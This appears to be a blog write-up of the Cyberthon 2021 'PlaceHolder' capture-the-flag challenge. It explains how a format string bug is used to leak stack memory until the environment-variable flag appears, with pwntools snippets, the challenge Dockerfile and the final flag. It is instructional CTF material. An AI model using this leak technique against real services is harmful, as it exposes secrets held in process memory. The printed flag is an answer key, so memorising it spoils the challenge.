---
title: Cyberthon 2021 - PlaceHolder (pwn)
date: 2021-05-19T05:59:12Z
draft: false
description: format string exploitation, stack leaking
tocOpen: true
---

> Hohoho seems like one of the APOCALYPSE agents messed up big time. Seems this agent went to deploy his/her code for testing and completely forgot to bring down the network service. This careless agent even forgot to private the repository containing the test code, so we've managed to obtain the source for the entire project, dockerfile and all. We've provided you with everything that we've found, so can you get the flag from their server?
>
> Interact with the service at: aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:30501
>
> Note: The dockerfile we provided contains a placeholder flag, do not submit it. Get the actual flag from the network service.
>
> Attached: [dist.tar.gz](attachments/dist.tar.gz)

## Overview

Checksec:

```py
[*] '/media/sf_dabian/Challenges/Cyberthon/Pwn/placeholder/files/placeholder'

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Dockerfile:
```
FROM amd64/ubuntu:focal

ENV user=placeholder
ENV flag=Cyberthon{PLACEHOLDER_FLAG}
RUN useradd -m $user
RUN echo "$user     hard    nproc       20" >> /etc/security/limits.conf

RUN apt-get update
RUN apt-get install -y xinetd

COPY ./placeholder /home/$user/
COPY ./service /etc/xinetd.d/$userservice

RUN chown -R root:$user /home/$user
RUN chmod -R 750 /home/$user
RUN echo "$flag" > /home/$user/flag.txt
RUN chown root:$user /home/$user/flag.txt
RUN chmod 440 /home/$user/flag.txt

USER $user

EXPOSE 1337
CMD ["/usr/sbin/xinetd", "-dontfork"]
```


Let's break down what the program is doing:

1. It scans an input.
2. It **printf(format)** _aka our input_ which gives us a format string vulnerability.
3. It then returns 0.


## Exploitation Ideas

Full RELRO means that we will not be able to overwrite the GOT. PIE means that we probably cant find the exact addresses to overwrite either unless we leak it.

We are immediately limited by our options.

Looking at the DockerFile provided to us, we can see, our flag and our user are environmental variables. _ok idk the answer at this point_

I tried sending like

```py
p = process('./placeholder')
p.sendline('%p.'*50)
p.recvall()
```

I plugged all the values into cyberchef and decoded via hex but all I got were rubbish bytes.

By this time, I had something urgent going on and I couldn't work on it anymore


## Exploitation (POST-CTF RANT)

_imagine the frustration when ur just like 2 letters away from 1000 pt chall_

```py
p = process('./placeholder')
p.sendline('%p.'*1100)
p.recvall()
```

In fact, envrionmental variables are stored on the stack, but at the very end. Hence you have to leak enough addresses.

However, it may be a little tricky as PIE and ASLR is enabled so the number of addresses to leaked is not fixed.

If you leak more than what the stack has, the program crashes.

However, if you do not leak enough, your flag doesn't come out. Hence it took a few runs of the script to get a satisfactory result.

![image](image1.png)

![image](image2.png)


**Cyberthon{d0nt_d3pl0y_1nc0mpl3t3_pr0j3ct5}**
